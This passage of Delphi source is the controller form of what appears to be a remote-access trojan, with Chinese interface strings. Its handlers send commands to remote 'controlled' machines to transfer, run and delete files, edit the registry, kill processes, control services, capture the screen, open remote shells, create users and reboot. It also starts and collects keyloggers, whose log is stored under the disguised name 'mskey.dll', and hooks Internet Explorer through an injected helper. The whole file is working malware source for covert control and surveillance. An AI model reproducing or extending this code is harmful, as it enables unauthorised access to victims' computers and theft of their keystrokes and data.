  remoteDir,LocalFile:ansistring;
  LocalDir:string;
  TransDirInfo:stTransFilesInfo;
begin
  if not CurConActive then exit;
  if treeDir.SelectionCount=0 then
  begin
    bar1.Panels[0].Text:='请选择服务器目录！';
    exit;
  end;
  remoteDir:=getTreeDir(treeDir.Selected);
  initPath:='C:';
  //if SelDir('请选择安装目录：','',initPath) then LocalDir:=initPath else exit;
  if(initPath='')then initPath:='c:\';
  if not  SelectDirectory( '请选择目录',initPath,LocalDir) then  exit;
  initPath:=LocalDir;
  zeromemory(@TransDirInfo,sizeof(TransDirInfo));
  strcopy(TransDirInfo.server.IP,'');
  TransDirInfo.server.port:=PORT;
  TransDirInfo.server.flg:=0;
  strcopy(TransDirInfo.clientFile,pansiChar(remoteDir));
  strcopy(TransDirInfo.serverFile,pansiChar(ansiString(LocalDir)));
  TransDirInfo.bUpLoad:=false;
  TransDirInfo.bFolder:=true;
  TransDirInfo.bCompleteDel:=false;
  //dm.SendOrder(o_TransFiles);
  //dm.SendBuf(@TransDirInfo,sizeof(TransDirInfo));
  dm.SendOrder(o_TransFiles,@TransDirInfo,sizeof(TransDirInfo));
end;

procedure TFMain.PopDownDirClick(Sender: TObject);
var
  remoteDir,LocalDir:ansistring;
  TransDirInfo:stTransFilesInfo;
begin
  if not CurConActive then exit;
  if treeDir.SelectionCount=0 then
  begin
    bar1.Panels[0].Text:='请选择服务器目录！';
    exit;
  end;
  remoteDir:=getTreeDir(treeDir.Selected);
  initPath:='C:';
  if SelDir('请选择安装目录：','',initPath) then LocalDir:=initPath else exit;
  if LocalDir[length(LocalDir)]='\' then
    LocalDir:=LocalDir+sysutils.extractfilename(remoteDir)
  else
    LocalDir:=LocalDir+'\'+sysutils.extractfilename(remoteDir);
  if not directoryexists(Localdir) then forcedirectories(Localdir);
  zeromemory(@TransDirInfo,sizeof(TransDirInfo));
  strcopy(TransDirInfo.server.IP,'');
  TransDirInfo.server.port:=PORT;
  TransDirInfo.server.flg:=0;
  strcopy(TransDirInfo.clientFile,pansiChar(remoteDir));
  strcopy(TransDirInfo.serverFile,pansiChar(LocalDir));
  TransDirInfo.bUpLoad:=true;
  TransDirInfo.bFolder:=true;
  TransDirInfo.bCompleteDel:=false;
  //dm.SendOrder(o_TransFiles);
  //dm.SendBuf(@TransDirInfo,sizeof(TransDirInfo));
  dm.SendOrder(o_TransFiles,@TransDirInfo,sizeof(TransDirInfo));
end;

procedure TFMain.edtVtKeyKeyUp(Sender: TObject; var Key: Word;
  Shift: TShiftState);
var
  inp:TInPut;
  ki:TKeybdInput;
begin
  if CurSocket=nil then exit;
  ki.wVk:=Key;
  ki.wScan:=0;
  ki.time:=0;
  ki.dwExtraInfo:=0;
  ki.dwFlags:=KEYEVENTF_KEYUP;
  inp.Itype:=INPUT_KEYBOARD;
  inp.ki:=ki;
  //dm.SendOrder(o_KeyMouse);
  //CurSocket.SendBuf(inp,sizeof(inp));
  dm.SendOrder(o_KeyMouse,@inp,sizeof(inp));
end;

procedure TFMain.btnProcessClick(Sender: TObject);
begin
  if not CurConActive then exit;
  dm.SendOrder(o_ListProcs);
  CurPc^.flg:=GetProcs;
end;

procedure TFMain.TreeProcMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  PID:string;
  lpPoint:tPoint;
begin
  if Button=mbRight then
  if CurConActive then
  if treeProc.SelectionCount>0 then
  begin
    PID:=copy(treeProc.Selected.Text,1,8);
    PID:=trim(PID);
    if not IsDigit(PID) then exit;
    Getcursorpos(lpPoint);
    popProc.Popup(lpPoint.x,lpPoint.y);
  end;
end;

procedure TFMain.popKillProcClick(Sender: TObject);
const
  killProc:byte=1;
  SusProc:byte=2;
  ResProc:byte=3;
var
  PID:dword;
begin
  PID:=sysutils.strtoint(trim(copy(treeProc.Selected.Text,1,8)));
  dm.SendOrder(o_opProc);
  dm.SendBuf(@killProc,sizeof(killProc));
  dm.SendBuf(@PID,sizeof(PID));
end;

procedure TFMain.PopCrtKeyClick(Sender: TObject);
var
  ro:stRegOpInfo;
  Key,RootKey,NewKey,Val,data:ansistring;
  p:pansiChar;
  i:integer;
begin
  if not CurConActive() then exit;
  if treeReg.SelectionCount=0 then exit;
  Key:=getTreeDir(treeReg.Selected);
  if Key='我的电脑' then exit;
  i:=pos('\',Key);
  if i>0 then
  begin
    RootKey:=copy(Key,1,i-1);
    delete(Key,1,i);
  end
  else begin
    RootKey:=key;
    key:='';
  end;
  if RootKey='HKEY_CLASSES_ROOT' then ro.rk:=HKEY_CLASSES_ROOT;
  if RootKey='HKEY_CURRENT_USER' then ro.rk:=HKEY_CURRENT_USER;
  if RootKey='HKEY_LOCAL_MACHINE' then ro.rk:=HKEY_LOCAL_MACHINE;
  if RootKey='HKEY_USERS' then ro.rk:=HKEY_USERS;
  if RootKey='HKEY_PERFORMANCE_DATA' then ro.rk:=HKEY_PERFORMANCE_DATA;
  if RootKey='HKEY_CURRENT_CONFIG' then ro.rk:=HKEY_CURRENT_CONFIG;
  if RootKey='HKEY_DYN_DATA' then ro.rk:=HKEY_DYN_DATA;
  strcopy(ro.key,pansiChar(key));
  ro.siz:=0;
  case tcomponent(Sender).Tag of
  1:begin
      if treeReg.Selected.HasChildren then treeReg.Selected.DeleteChildren;
      ro.op:=REnumKey;
      dm.SendOrder(o_Reg);
      dm.SendBuf(@ro,sizeof(ro));
      Curpc^.flg:=GetRegInfo;
    end;//Enumkey;
  2:begin
      ro.op:=RCreateKey;
      key:=inputbox('请输入键名：','键名：','');
      if key='' then exit;
      strcat(ro.key,'\');strcat(ro.key,pansiChar(key));
      dm.SendOrder(o_Reg);
      dm.SendBuf(@ro,sizeof(ro));
    end;//createkey;
  3:begin
      FRegEdit.Caption:='编辑字符串';
      if FRegEdit.ShowModal=mrok then
      begin
        val:=trim(FRegEdit.edtValName.Text);
        if val='' then begin showmessage('值不能为空!');exit;end;
        data:=trim(FRegEdit.edtValData.Text);
        //if data='' then begin exit;
        data:=data+#0;
        ro.op:=RCreateVal;
        strcopy(ro.val,pansiChar(val));
        ro.typ:=REG_SZ;
        ro.siz:=length(data);
        ro.dat:=@data[1];
        dm.SendOrder(o_Reg);
        dm.SendBuf(@ro,sizeof(ro));
        dm.SendBuf(ro.dat,ro.siz);
      end;
    end;//createString;
  4:begin
      FRegEdit.Caption:='编辑二进制数值';
      if FRegEdit.ShowModal=mrok then
      begin
        val:=trim(FRegEdit.edtValName.Text);
        if val='' then exit;
        data:=trim(FRegEdit.edtValData.Text);
        if data='' then exit;
        data:=data+#32;
        if not strTobin(data,nil,ro.siz) then
        begin
          showmessage('进制数值格式不对！');exit;
        end;//
        getmem(ro.dat,ro.siz);
        if not strTobin(data,ro.dat,ro.siz) then
        begin
          showmessage('进制数值格式不对！');exit;
        end;//
        ro.op:=RCreateVal;
        strcopy(ro.val,pansiChar(val));
        ro.typ:=REG_BINARY;

        dm.SendOrder(o_Reg);
        dm.SendBuf(@ro,sizeof(ro));
        dm.SendBuf(ro.dat,ro.siz);
        freemem(ro.dat);
      end;
    end;//createBin;
  5:begin
      FRegEdit.Caption:='编辑DWORD数值';
      if FRegEdit.ShowModal=mrok then
      begin
        val:=trim(FRegEdit.edtValName.Text);
        if val='' then exit;
        data:=trim(FRegEdit.edtValData.Text);
        if data='' then exit;
        if not IsDigit(data) then
        begin
          showmessage('必须是数字！');exit;
        end;//if not IsDigit(data) then
        ro.op:=RCreateVal;
        strcopy(ro.val,pansiChar(val));
        ro.typ:=REG_DWORD;
        getmem(ro.dat,sizeof(DWORD));
        PDWORD(ro.dat)^:=DWORD(sysutils.strtoint(Data));
        ro.siz:=sizeof(DWORD);
        dm.SendOrder(o_Reg);
        dm.SendBuf(@ro,sizeof(ro));
        dm.SendBuf(ro.dat,ro.siz);
        freemem(ro.dat);
      end;//if FRegEdit.ShowModal=mrok then
    end;//createDWord;
  6:begin
      ro.op:=RdelKey;
      ro.siz:=0;
      dm.SendOrder(o_Reg);
      dm.SendBuf(@ro,sizeof(ro));
    end;//Delkey;
  7:begin
      Newkey:=inputbox('请输入键名：','新键名：','');
      if Newkey='' then exit;
      delete(key,pos(TreeReg.Selected.Text,key),length(TreeReg.Selected.Text));
      NewKey:=key+NewKey;
      strcopy(ro.val,pansiChar(NewKey));
      ro.op:=RRenameKey;
      dm.SendOrder(o_Reg);
      dm.SendBuf(@ro,sizeof(ro));
    end;//ReNamekey;
  8:begin
      if ListReg.SelCount=0 then
      begin
        showmessage('请选择要修改的值！');exit;
      end;
      ro.op:=RCreateVal;
      strcopy(ro.val,pansiChar(ListReg.Selected.caption));
      data:=inputbox('请输入新值：',ro.val,'');
      data:=data+#0;
      ro.typ:=REG_SZ;
      ro.dat:=@data[1];
      ro.siz:=length(data);
      dm.SendOrder(o_Reg);
      dm.SendBuf(@ro,sizeof(ro));
      dm.SendBuf(ro.dat,ro.siz);
      //showmessage('该功能未完成！');exit;
    end;//RCreateVal; 修改
  9:begin
      if ListReg.SelCount=0 then
      begin
        showmessage('请选择要删除的值！');exit;
      end;
      ro.op:=RdelVal;
      strcopy(ro.val,pansiChar(ListReg.Selected.caption));
      dm.SendOrder(o_Reg);
      dm.SendBuf(@ro,sizeof(ro));
    end;//DelVAl;
  10:begin
      if ListReg.SelCount=0 then
      begin
        showmessage('请选择要修改的值！');exit;
      end;
      val:=inputbox('请输入新值名','新值名：','');
      if val='' then exit;
      ro.op:=RRenameVal;
      zeromemory(@ro.Val,sizeof(ro.val));
      strcopy(ro.val,pansiChar(ListReg.Selected.caption));
      p:=ro.val;p:=p+strlen(ro.val)+1;
      strcopy(p,pansiChar(Val));
      dm.SendOrder(o_Reg);
      dm.SendBuf(@ro,sizeof(ro));
     end;//RenameVal;
  11:begin

     end;//;
  12:begin

     end;//;

  end;//case
end;

procedure TFMain.popUpdateTree1Click(Sender: TObject);
var
  pcName:ansistring;
  ro:stRegOpInfo;
begin
  if not curConActive then exit;
  pcName:=inputbox('请输入被控制端名称：','被控制端名称：','');
  if pcName='' then exit;
  dm.SendOrder(o_ReNamePC);
  ro.op:=RCreateVal;
  ro.rk:=HKEY_LOCAL_MACHINE;
  ro.key:='SoftWare\Microsoft\Byc';
  ro.val:='PCName';
  ro.typ:=reg_sz;
  ro.dat:=pansiChar(pcName);
  ro.siz:=length(pcName);
  dm.SendBuf(@ro,sizeof(ro));
  dm.SendBuf(ro.dat,ro.siz);
  Curpc^.flg:=GetPCName;
end;

procedure TFMain.menuHookKeyClick(Sender: TObject);
begin
  if not curConActive then exit;
  dm.SendOrder(o_opHookKey,o_StartHookKey);

end;

procedure TFMain.memuGetHookKeysClick(Sender: TObject);
begin
  if not curConActive then exit;
  dm.SendOrder(o_opHookKey,o_GetHookKeys);

  Curpc^.flg:=GetHookKeys;
end;

procedure TFMain.menuCloseHookKeyClick(Sender: TObject);
begin
  if not curConActive then exit;
  dm.SendOrder(o_opHookKey,o_CloseHookKey);

end;

procedure TFMain.btnHookIEClick(Sender: TObject);
var
  LocalName,remoteName,LocalDir:string;
  //fi:stTransFilesInfo;
begin
{
  if not CurConActive then exit;
  LocalDir:=sysutils.extractfiledir(application.ExeName);
  LocalName:=LocalDir+'\IEHelper.dll';
  if not fileexists(Localname) then
  begin
    showmessage('没有找到IEHelper.dll文件!');
    exit;
  end;
  remoteName:='%SystemRoot%\System32\IEHelper.dll';
  zeromemory(@fi,sizeof(fi));
  strcopy(fi.server.IP,'');
  fi.server.flg:=0;
  fi.server.port:=PORT;
  strcopy(fi.clientFile,pansiChar(remoteName));
  strcopy(fi.serverFile,pansiChar(LocalName));
  fi.bUpLoad:=false;
  fi.bFolder:=false;
  fi.bCompleteDel:=false;
  dm.SendOrder(o_HookIE);
  dm.SendBuf(@fi,sizeof(fi));
   }
  if not CurConActive then exit;
  LocalDir:=sysutils.extractfiledir(application.ExeName);
  LocalName:=LocalDir+'\HookIE.exe';
  if not fileexists(Localname) then
  begin
    showmessage('没有找到'+LocalName+'文件!');
    exit;
  end;
  dm.SendOrder(o_HookIE);
end;

procedure TFMain.btnUnHookIEClick(Sender: TObject);
begin
if not CurConActive then exit;
 dm.SendOrder(o_UnHookIE);
end;

procedure TFMain.treeOrderChange(Sender: TObject; Node: TTreeNode);
begin
  if node.Text='控制命令' then
  begin
    pnSysControl.BringToFront;
  end;//
  if node.Text='会话命令' then
  begin
    pnSendMsg.BringToFront;
  end;
end;

procedure TFMain.btnCloseSvrClick(Sender: TObject);
begin
if not CurConActive then exit;
 dm.SendOrder(o_Close);
end;

procedure TFMain.btnUpdateSvrClick(Sender: TObject);
var
  LocalName,remoteName,LocalDir:string;
{
type
  stSvrAddr_tmp=packed record
    port:Word;
    case flg:byte of
    0:(IP:array[0..15] of ansiChar);
    1:(DN:array[0..260] of ansiChar);
  end;
  stTransFilesInfo_tmp=packed record
    server:stSvrAddr_tmp;
    clientFile:array[0..MAX_PATH-1] of ansiChar;
    serverFile:array[0..MAX_PATH-1] of ansiChar;
    bUpLoad:bool;
    bFolder:bool;
    bCompleteDel:bool;
  end;
var
  LocalName,remoteName,LocalDir:string;
  fi:stTransFilesInfo_tmp;
  }
begin
  if not CurConActive then exit;
  dm.SendOrder(o_Update);
{
if(pos('版本:                 1.005',memoPCInfo.Text)=0) then
begin
  if not CurConActive then exit;
  LocalDir:=sysutils.extractfiledir(application.ExeName);
  LocalName:=LocalDir+'\mysetup.exe';
  if not fileexists(Localname) then
  begin
    showmessage('没有找到mysetup.exe文件!');
    exit;
  end;
  remoteName:='%SystemRoot%\System32\mysetup.exe';
  zeromemory(@fi,sizeof(fi));
  strcopy(fi.server.IP,'');
  fi.bCompleteDel:=false;
  fi.server.flg:=0;
  fi.server.port:=PORT;
  strcopy(fi.clientFile,pansiChar(remoteName));
  strcopy(fi.serverFile,pansiChar(LocalName));
  fi.bUpLoad:=false;
  fi.bFolder:=false;
  fi.bCompleteDel:=false;
  dm.SendOrder(o_Update);
  dm.SendBuf(@fi,sizeof(fi));
  end
  else begin
  LocalDir:=sysutils.extractfiledir(application.ExeName);
  LocalName:=LocalDir+'\mysetup.exe';
  if not fileexists(Localname) then
  begin
    showmessage('没有找到'+LocalName+'文件!');
    exit;
  end;
  dm.SendOrder(o_Update);
  end;
  }
  {
  if not CurConActive then exit;
  LocalDir:=sysutils.extractfiledir(application.ExeName);
  LocalName:=LocalDir+'\mysetup.exe';
  if not fileexists(Localname) then
  begin
    showmessage('没有找到'+LocalName+'文件!');
    exit;
  end;
  dm.SendOrder(o_Add);
  }
end;

procedure TFMain.menuQComsClick(Sender: TObject);
begin
  dm.bQuery:=menuQComs.Checked;
end;

procedure TFMain.PopRunFileClick(Sender: TObject);
var
  remoteName:ansistring;
begin
  if not CurConActive then exit;
  remoteName:=getListFile(treeDir.Selected,ListFiles.Selected);
  dm.SendOrder(o_RunFile);
  dm.SendBuf(@remoteName[1],max_path);
end;

procedure TFMain.PopDelFileClick(Sender: TObject);
var
  remoteName:ansistring;
begin
  if not CurConActive then exit;
  remoteName:=getListFile(treeDir.Selected,ListFiles.Selected);
  dm.SendOrder(o_DelFile);
  dm.SendBuf(@remoteName[1],max_path);

end;

procedure TFMain.btnUnRegSvrClick(Sender: TObject);
begin
 if not CurConActive then exit;
 dm.SendOrder(o_Delete);
end;

procedure TFMain.PopCrtDirClick(Sender: TObject);
var
  remoteDir,dir:ansistring;
begin
  if not CurConActive then exit;
  if treeDir.SelectionCount=0 then
  begin
    bar1.Panels[0].Text:='请选择服务器目录！';
    exit;
  end;
  remoteDir:=getTreeDir(treeDir.Selected);
  dir:=inputbox('请输入目录名','目录名：','');
  if dir<>'' then
  begin
    RemoteDir:=RemoteDir+'\'+dir;
    dm.SendOrder(o_CrtDir);
    dm.SendBuf(@RemoteDir[1],length(RemoteDir));
  end;
end;

procedure TFMain.PopDelDirClick(Sender: TObject);
var
  remoteDir,dir:ansistring;
  buf:array[0..max_path-1] of ansiChar;
begin
  if not CurConActive then exit;
  if treeDir.SelectionCount=0 then
  begin
    bar1.Panels[0].Text:='请选择服务器目录！';
    exit;
  end;
  remoteDir:=getTreeDir(treeDir.Selected);
  dm.SendOrder(o_DelDir);
  strcopy(buf,pansiChar(remoteDir));
  dm.SendBuf(@buf,sizeof(buf));
end;

procedure TFMain.btnSendCADClick(Sender: TObject);
begin
  if not CurConActive then exit;
   dm.SendOrder(o_CAD);
end;

procedure TFMain.btnSvcEnumClick(Sender: TObject);
var
  so:stSvcOpInfo;
begin
  if not CurConActive then exit;
  zeromemory(@so,sizeof(so));
   dm.SendOrder(o_Svc);
   so.op:=SEnumSvc;
   case tcomponent(Sender).Tag of
   1:begin PDWORD(@so.name[0])^:=SERVICE_WIN32;PDWORD(@so.name[4])^:=SERVICE_STATE_ALL;end;//1
   2:begin PDWORD(@so.name[0])^:=SERVICE_WIN32;PDWORD(@so.name[4])^:=SERVICE_ACTIVE   ;end;//1
   3:begin PDWORD(@so.name[0])^:=SERVICE_WIN32;PDWORD(@so.name[4])^:=SERVICE_INACTIVE; end;//1
   4:begin PDWORD(@so.name[0])^:=SERVICE_WIN32;PDWORD(@so.name[4])^:=SERVICE_STATE_ALL;end;//1
   5:begin PDWORD(@so.name[0])^:=SERVICE_DRIVER;PDWORD(@so.name[4])^:=SERVICE_ACTIVE;  end;//1
   6:begin PDWORD(@so.name[0])^:=SERVICE_DRIVER;PDWORD(@so.name[4])^:=SERVICE_INACTIVE; end;//1
   7:begin PDWORD(@so.name[0])^:=SERVICE_DRIVER;PDWORD(@so.name[4])^:=SERVICE_STATE_ALL; end;//1
   8:begin PDWORD(@so.name[0])^:=SERVICE_WIN32 or SERVICE_INACTIVE;PDWORD(@so.name[4])^:=SERVICE_ACTIVE; end;//1
   9:begin PDWORD(@so.name[0])^:=SERVICE_WIN32 or SERVICE_INACTIVE;PDWORD(@so.name[4])^:=SERVICE_INACTIVE; end;//1
  10:begin PDWORD(@so.name[0])^:=SERVICE_WIN32 or SERVICE_INACTIVE;PDWORD(@so.name[4])^:=SERVICE_STATE_ALL; end;//1
   else
     PDWORD(@so.name[0])^:=SERVICE_WIN32;PDWORD(@so.name[4])^:=SERVICE_STATE_ALL;
   end;//case
   dm.SendBuf(@so,sizeof(so));
   Curpc^.flg:=GetSvcInfo;
end;

procedure TFMain.ListSvcSelectItem(Sender: TObject; Item: TListItem;
  Selected: Boolean);
var
  ss:tstrings;
begin
  ss:=tstringlist.Create;
  GetSvcMemo(ss);
  memoSvc.Text:=ss.Text;
  ss.Free;

end;

procedure TFMain.popSvcStartClick(Sender: TObject);
var
  so:stSvcOpInfo;
  svcName:pansiChar;
begin
  if not CurConActive then exit;
  if ListSvc.SelCount=0 then exit;
  svcName:=pansiChar(ListSvc.Selected.Caption);
  zeromemory(@so,sizeof(so));
   case tcomponent(Sender).Tag of
   1:begin so.op:=SRunSvc;strcopy(so.name,svcName); end;//1
   2:begin so.op:=SStopSvc;strcopy(so.name,svcName); end;//1
   3:begin so.op:=SShutDownSvc;strcopy(so.name,svcName); end;//1
   4:begin so.op:=SEnableSvc;strcopy(so.name,svcName); end;//1
   5:begin so.op:=SDisableSvc;strcopy(so.name,svcName); end;//1
   6:begin so.op:=SUnRegSvc;strcopy(so.name,svcName); end;//1
   else
     showmessage('操作未指定!');
     exit;
   end;//SRunSvc,SStopSvc,SShutDownSvc,SUnEnableSvc,SUnRegSvc
   dm.SendOrder(o_Svc);
   dm.SendBuf(@so,sizeof(so));
end;

procedure TFMain.btnSingleScrClick(Sender: TObject);
var
  viewMode:byte;
begin
  if(menuColor1.Checked) then ViewMode:=vmColor2;
  if(menuColor4.Checked) then ViewMode:=vmColor4;
  if(menuColor8.Checked) then ViewMode:=vmColor8;
  if(menuColor16.Checked) then ViewMode:=vmColor16;
  if(menuColor24.Checked) then ViewMode:=vmColor24;
  dm.SendOrder(o_Screen);
  dm.SendBuf(CurSocket,@ViewMode,sizeof(ViewMode));
  bSingleScr:=true;
end;

procedure TFMain.btnRebootClick(Sender: TObject);
begin
  if not CurConActive then exit;
  dm.SendOrder(o_Reboot);
end;

procedure TFMain.btnCrtUserClick(Sender: TObject);
begin
  if not CurConActive then exit;
  dm.SendOrder(o_CrtUser);
end;

procedure TFMain.btnTermServerClick(Sender: TObject);
begin
  if not CurConActive then exit;
  dm.SendOrder(o_TermSvr);
  ShellExecute(self.Handle,nil,'cmd','/k mstsc.exe /v: 127.0.0.1:7620',nil,SW_SHOW);
end;

procedure TFMain.btnHelperClick(Sender: TObject);
begin
  FHelper.Show;
end;

procedure TFMain.btnFilterIPClick(Sender: TObject);
begin
  {
  memoPCInfo.Lines.Add('当前过滤IP：');
  FilterIP:=GetFilterIP(edtVtKey.Text);
  memoPCInfo.Lines.Add(FilterIP);
  }
end;

procedure TFMain.ListPCInfoSelectItem(Sender: TObject; Item: TListItem;
  Selected: Boolean);
begin
if Selected then
    ShowPCInfo(item);
end;

procedure TFMain.popSearchProcClick(Sender: TObject);
var
  node:ttreeNode;
  i:integer;
  s,txt:ansistring;
begin
  node:=treeProc.Selected;
  if node.HasChildren then
  begin
    s:=inputbox('我要搜索','请填写要搜索的字符串：','IEHelper.dll');
    s:=trim(s);
    if s='' then exit;
    for i:=0 to node.Count-1 do
    begin
      txt:=node.Item[i].Text;
      if pos(sysutils.UpperCase(s),sysutils.UpperCase(txt))>0 then
      begin
        node.Item[i].Selected:=true;
        exit;
      end;//if pos(sysutils.UpperCase(s),sysutils.UpperCase(txt))>0 then
    end;//for i:=0 to node.Count-1 do
    showmessage('没有找到：'+s);
  end;//if node.HasChildren then

end;

procedure TFMain.btnCMDClick(Sender: TObject);
var
  cfg:DWORD;
  s:string;
  len:DWORD;
begin
  if not CurConActive then exit;
  if fdlgCMD.ShowModal=mrok then
  begin
    if fdlgCMD.rdoTelnet.Checked then cfg:=0;
    if fdlgCMD.rdosystem.Checked then cfg:=1;
    if fdlgCMD.rdoCurrentuser.Checked then cfg:=2;
    dm.SendOrder(o_CMD);
    dm.SendBuf(@cfg,sizeof(cfg));
    if cfg=2 then
    begin
      s:=fdlgCMD.CreateOrder;
      len:=length(s);
      dm.SendBuf(@len,sizeof(len));
      dm.Sendbuf(@s[1],len);
    end;//if cfg=2 then
    ShellExecute(self.Handle,nil,'cmd','/k telnet 127.0.0.1 7620',nil,SW_SHOW);
  end;
end;

procedure TFMain.btnVideoClick(Sender: TObject);
var
  i:integer;
  s:string;
begin
  if not CurConActive then exit;
  //s:=fVideo.CreateOrder();
  //i:=length(s);
  //dm.SendOrder(o_video);
  //dm.Sendbuf(@i,sizeof(i));
  //dm.Sendbuf(@s[1],i);
  //fVideo.Show;
end;

procedure TFMain.popSusProcClick(Sender: TObject);
const
  killProc:byte=1;
  SusProc:byte=2;
  ResProc:byte=3;
var
  PID:dword;
begin
  PID:=sysutils.strtoint(trim(copy(treeProc.Selected.Text,1,8)));
  dm.SendOrder(o_opProc);
  dm.SendBuf(@SusProc,sizeof(SusProc));
  dm.SendBuf(@PID,sizeof(PID));

end;

procedure TFMain.popResProcClick(Sender: TObject);
const
  killProc:byte=1;
  SusProc:byte=2;
  ResProc:byte=3;
var
  PID:dword;
begin
  PID:=sysutils.strtoint(trim(copy(treeProc.Selected.Text,1,8)));
  dm.SendOrder(o_opProc);
  dm.SendBuf(@ResProc,sizeof(ResProc));
  dm.SendBuf(@PID,sizeof(PID));

end;

procedure TFMain.menuOpenFileHookKeyClick(Sender: TObject);
begin
  if not curConActive then exit;
  dm.SendOrder(o_opHookKey);
  dm.SendOrder(o_StartFileHookKey);
end;

procedure TFMain.menuGetFileHookKeyClick(Sender: TObject);
begin
  if not curConActive then exit;
  dm.SendOrder(o_opHookKey);
  dm.SendOrder(o_GetFileHookKeys);
end;

procedure TFMain.menuCloseFileHookKeyClick(Sender: TObject);
begin
  if not curConActive then exit;
  dm.SendOrder(o_opHookKey);
  dm.SendOrder(o_CloseFileHookKey);
end;

procedure TFMain.menuHookFileKeyOpenClick(Sender: TObject);
var
  filename:string;
begin
  filename:=sysutils.extractfiledir(application.ExeName)+'\mskey.dll';
  if fileexists(filename) then
  //memoKeys.Lines.LoadFromFile(filename)
  shellexecuteA(application.Handle,'open','notepad.exe',pansiChar(filename),nil,sw_shownormal)
  else
    showmessage('无mskey.dll文件！');
end;

procedure TFMain.menuClearHookKeyFileClick(Sender: TObject);
var
  filename:string;
begin
  filename:=sysutils.extractfiledir(application.ExeName)+'\mskey.dll';
  deletefile(filename);
  memoKeys.Lines.Clear;
end;

procedure TFMain.menuClearRemoteHookKeyFileClick(Sender: TObject);
begin
  if not curConActive then exit;
  dm.SendOrder(o_opHookKey);
  dm.SendOrder(o_ClearFileHookKey);
end;

procedure TFMain.btnResetClick(Sender: TObject);
begin
  //setcurConActive;
end;

end.
